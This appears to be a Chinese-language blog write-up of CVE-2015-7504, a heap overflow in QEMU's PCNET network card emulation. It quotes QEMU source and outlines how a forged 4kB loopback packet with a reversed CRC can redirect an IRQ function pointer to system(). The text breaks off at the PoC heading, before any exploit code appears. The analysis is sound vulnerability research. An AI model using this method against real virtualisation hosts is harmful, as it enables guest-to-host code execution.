class=post-content><p>CVE-2015-7504是QEMU在仿真pcnet网卡中出现的一个堆溢出漏洞，可以溢出四个字节，可以劫持程序的执行流，结合前面的CVE-2015-5165可以实现任意代码执行。但有一个很致命的问题，宿主机内核需要使用<code>CONFIG_ARCH_BINFMT_ELF_RANDOMIZE_PIE </code>标志进行编译，否则在溢出的四个字节没法成功修改地址（总体八个字节的地址，因此需要高四字节与目标地址一致）。这个编译标志在目前最新的Ubuntu16.04中似乎已经没有了，所以就不进行完整的复现了，仅复现至PoC部分。</p><h2 id=pcnet网卡>PCNET网卡<a hidden class=anchor aria-hidden=true href=#pcnet网卡>#</a></h2><p>AMD 的PCNET系列网卡被许多虚拟机或仿真器支持，如QEMU、VMware和VirtualBox。虽然没有RTL8139简易，但它的支持更加广泛，RTL8139只在QEMU中有支持。</p><p>网卡有16位和32位两种模式，这取决于DWIO 的值（储存在卡中变量），16位模式是网卡重置之后的默认模式。网卡有两类内部寄存器：CSR（控制和状态寄存器）和BCR（Bus Control Register）。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>            0                                  16
</span></span><span class=line><span class=cl>            +----------------------------------+
</span></span><span class=line><span class=cl>            |              EPROM               |
</span></span><span class=line><span class=cl>            +----------------------------------+
</span></span><span class=line><span class=cl>            |      RDP - Data reg for CSR      |
</span></span><span class=line><span class=cl>            +----------------------------------+
</span></span><span class=line><span class=cl>            | RAP - Index reg for CSR and BCR  |
</span></span><span class=line><span class=cl>            +----------------------------------+
</span></span><span class=line><span class=cl>            |           Reset reg              |
</span></span><span class=line><span class=cl>            +----------------------------------+
</span></span><span class=line><span class=cl>            |      BDP - Data reg for BCR      |
</span></span><span class=line><span class=cl>            +----------------------------------+
</span></span></code></pre></td></tr></table></div></div><p>两种寄存器都需要通过设置对应的我们要访问的RAP（寄存器地址端口）寄存器来实现对相应CSR或BCR寄存器的访问。例如，如果想要初始化或者重启网卡，得设置CSR0的bit0和bit1为1，这个操作可以通过设置RAP为0，然后设置CSR为3来实现。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>outw</span><span class=p>(</span><span class=mh>0x0</span><span class=p>,</span> <span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=n>RAP</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>outw</span><span class=p>(</span><span class=mh>0x3</span><span class=p>,</span> <span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=n>RDP</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>网卡的配置可以通过填充一个初始化结构体，并将该结构体的物理地址传送到网卡（通过设置CSR[1]和CSR[2]）来完成，结构体定义如下（通过查询qemu实现的PCNET的规范，发现这个<code>pcnet_config</code>对应的是32位IDAR的config）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>pcnet_config</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint16_t</span>  <span class=n>mode</span><span class=p>;</span>      <span class=cm>/* working mode: promiscusous, looptest, etc. */</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span>   <span class=n>rlen</span><span class=p>;</span>      <span class=cm>/* number of rx descriptors in log2 base */</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span>   <span class=n>tlen</span><span class=p>;</span>      <span class=cm>/* number of tx descriptors in log2 base */</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span>   <span class=n>mac</span><span class=p>[</span><span class=mi>6</span><span class=p>];</span>    <span class=cm>/* mac address */</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint16_t</span> <span class=n>_reserved</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span>   <span class=n>ladr</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span>   <span class=cm>/* logical address filter */</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span>  <span class=n>rx_desc</span><span class=p>;</span>   <span class=cm>/* physical address of rx descriptor buffer */</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span>  <span class=n>tx_desc</span><span class=p>;</span>   <span class=cm>/* physical address of tx descriptor buffer */</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p><img alt=image-20201209211827489 loading=lazy src=https://raw.githubusercontent.com/clxsh/pics/master/img/image-20201209211827489.png></p><h2 id=漏洞分析>漏洞分析<a hidden class=anchor aria-hidden=true href=#漏洞分析>#</a></h2><p>PCNET网卡在loopback测试模式中接收到大尺寸的数据包时，存在一个堆上的溢出漏洞。PCNET的仿真使用了4kB的缓冲区来存储数据包。如果接收描述符(Tx descriptor)存在<code>ADDFCS</code>标志，那么网卡将在数据包的尾部添加CRC校验码（见<code>pcnet_receive()</code>函数，<code>hw/net/pcnet.c</code>）。在接收小于4096-4字节的时候，不会出现任何问题，但如果这个数据包就是4096字节大小，那么将会在目标缓冲区溢出4个字节。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>ssize_t</span> <span class=nf>pcnet_receive</span><span class=p>(</span><span class=n>NetClientState</span> <span class=o>*</span><span class=n>nc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>size_</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// .......
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=nf>CSR_CRST</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0x8000</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=cp>#ifdef PCNET_DEBUG_RMD
</span></span></span><span class=line><span class=cl><span class=cp></span>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;pcnet - no buffer: RCVRC=%d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>CSR_RCVRC</span><span class=p>(</span><span class=n>s</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>            <span class=n>s</span><span class=o>-&gt;</span><span class=n>csr</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>|=</span> <span class=mh>0x1000</span><span class=p>;</span> <span class=cm>/* Set MISS flag */</span>
</span></span><span class=line><span class=cl>            <span class=nf>CSR_MISSC</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>src</span> <span class=o>=</span> <span class=n>s</span><span class=o>-&gt;</span><span class=n>buffer</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>hwaddr</span> <span class=n>crda</span> <span class=o>=</span> <span class=nf>CSR_CRDA</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>struct</span> <span class=n>pcnet_RMD</span> <span class=n>rmd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=kt>int</span> <span class=n>pktcount</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>s</span><span class=o>-&gt;</span><span class=n>looptest</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>memcpy</span><span class=p>(</span><span class=n>src</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=cm>/* no need to compute the CRC */</span>
</span></span><span class=line><span class=cl>                <span class=n>src</span><span class=p>[</span><span class=n>size</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>src</span><span class=p>[</span><span class=n>size</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>src</span><span class=p>[</span><span class=n>size</span> <span class=o>+</span> <span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>src</span><span class=p>[</span><span class=n>size</span> <span class=o>+</span> <span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>size</span> <span class=o>+=</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>s</span><span class=o>-&gt;</span><span class=n>looptest</span> <span class=o>==</span> <span class=n>PCNET_LOOPTEST_CRC</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>                       <span class=o>!</span><span class=nf>CSR_DXMTFCS</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=o>||</span> <span class=n>size</span> <span class=o>&lt;</span> <span class=n>MIN_BUF_SIZE</span><span class=o>+</span><span class=mi>4</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=kt>uint32_t</span> <span class=n>fcs</span> <span class=o>=</span> <span class=o>~</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>p</span> <span class=o>=</span> <span class=n>src</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>while</span> <span class=p>(</span><span class=n>p</span> <span class=o>!=</span> <span class=o>&amp;</span><span class=n>src</span><span class=p>[</span><span class=n>size</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                    <span class=nf>CRC</span><span class=p>(</span><span class=n>fcs</span><span class=p>,</span> <span class=o>*</span><span class=n>p</span><span class=o>++</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=o>*</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=o>*</span><span class=p>)</span><span class=n>p</span> <span class=o>=</span> <span class=nf>htonl</span><span class=p>(</span><span class=n>fcs</span><span class=p>);</span>    <span class=c1>// bug here
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=n>size</span> <span class=o>+=</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=kt>uint32_t</span> <span class=n>fcs</span> <span class=o>=</span> <span class=o>~</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>p</span> <span class=o>=</span> <span class=n>src</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>while</span> <span class=p>(</span><span class=n>p</span> <span class=o>!=</span> <span class=o>&amp;</span><span class=n>src</span><span class=p>[</span><span class=n>size</span><span class=o>-</span><span class=mi>4</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                    <span class=nf>CRC</span><span class=p>(</span><span class=n>fcs</span><span class=p>,</span> <span class=o>*</span><span class=n>p</span><span class=o>++</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>crc_err</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=o>*</span><span class=p>)</span><span class=n>p</span> <span class=o>!=</span> <span class=nf>htonl</span><span class=p>(</span><span class=n>fcs</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=c1>// .......
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>在上面的代码中变量<code>s</code>指向PCNET的主要结构<code>PCNetState_st</code>，从它的结构来看（见下）。溢出会修改它的<code>irq</code>成员的低4字节，通过对CRC的逆向，可以完全控制溢出的4字节的内容。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>PCNetState_st</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>NICState</span> <span class=o>*</span><span class=n>nic</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>NICConf</span> <span class=n>conf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>QEMUTimer</span> <span class=o>*</span><span class=n>poll_timer</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>rap</span><span class=p>,</span> <span class=n>isr</span><span class=p>,</span> <span class=n>lnkst</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>rdra</span><span class=p>,</span> <span class=n>tdra</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span> <span class=n>prom</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint16_t</span> <span class=n>csr</span><span class=p>[</span><span class=mi>128</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint16_t</span> <span class=n>bcr</span><span class=p>[</span><span class=mi>32</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>xmit_pos</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>timer</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>MemoryRegion</span> <span class=n>mmio</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>4096</span><span class=p>];</span>  <span class=c1>// overflow here
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>qemu_irq</span> <span class=n>irq</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>phys_mem_read</span><span class=p>)(</span><span class=kt>void</span> <span class=o>*</span><span class=n>dma_opaque</span><span class=p>,</span> <span class=n>hwaddr</span> <span class=n>addr</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                          <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span> <span class=kt>int</span> <span class=n>len</span><span class=p>,</span> <span class=kt>int</span> <span class=n>do_bswap</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>phys_mem_write</span><span class=p>)(</span><span class=kt>void</span> <span class=o>*</span><span class=n>dma_opaque</span><span class=p>,</span> <span class=n>hwaddr</span> <span class=n>addr</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                           <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span> <span class=kt>int</span> <span class=n>len</span><span class=p>,</span> <span class=kt>int</span> <span class=n>do_bswap</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=o>*</span><span class=n>dma_opaque</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>tx_busy</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>looptest</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>这个<code>irq</code>成员变量指向一个<code>IRQState</code>结构的指针，该结构又含有函数指针。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// include/hw/irq.h
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>typedef</span> <span class=k>struct</span> <span class=n>IRQState</span> <span class=o>*</span><span class=n>qemu_irq</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=nf>void</span> <span class=p>(</span><span class=o>*</span><span class=n>qemu_irq_handler</span><span class=p>)(</span><span class=kt>void</span> <span class=o>*</span><span class=n>opaque</span><span class=p>,</span> <span class=kt>int</span> <span class=n>n</span><span class=p>,</span> <span class=kt>int</span> <span class=n>level</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// hw/core/irq.c
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>struct</span> <span class=n>IRQState</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>Object</span> <span class=n>parent_obj</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>qemu_irq_handler</span> <span class=n>handler</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=o>*</span><span class=n>opaque</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>n</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>这个函数将会被调用多次。例如，在<code>pcnet_receive()</code>函数的末尾，将会调用<code>pcnet_update_irq()</code>，其中会继续调用<code>qemu_set_irq()</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// hw/core/irq.c
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>void</span> <span class=nf>qemu_set_irq</span><span class=p>(</span><span class=n>qemu_irq</span> <span class=n>irq</span><span class=p>,</span> <span class=kt>int</span> <span class=n>level</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>irq</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>irq</span><span class=o>-&gt;</span><span class=nf>handler</span><span class=p>(</span><span class=n>irq</span><span class=o>-&gt;</span><span class=n>opaque</span><span class=p>,</span> <span class=n>irq</span><span class=o>-&gt;</span><span class=n>n</span><span class=p>,</span> <span class=n>level</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=利用的流程>利用的流程<a hidden class=anchor aria-hidden=true href=#利用的流程>#</a></h2><ul><li>构造一个<code>IRQState</code>结构，其中包含一个想要执行的函数的指针（如：<code>system()</code>）</li><li>计算构造的结构的准确地址。通过前述CVE-2015-5165泄露的基地址，可以达成这个目标。</li><li>伪造一个4kB的数据包。对CRC进行逆向，使其指向构造的<code>IRQState</code>结构</li><li>发送数据包</li></ul><p>loopback接收之后：</p><ul><li>将收的数据包拷贝到缓冲区</li><li>计算数据包的CRC，添加到末尾，也就覆盖了<code>irq</code>变量的低4字节</li><li>调用<code>pcnet_update_irq()</code>函数，触发目标函数指针。</li></ul><h2 id=poc>PoC<a hidden class=anchor aria-hidden=true href=#poc>#</a></h2><p><a href=https://github.com/clxsh/CVE/blob/main/CVE-2015-7504/poc.c>Poc</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
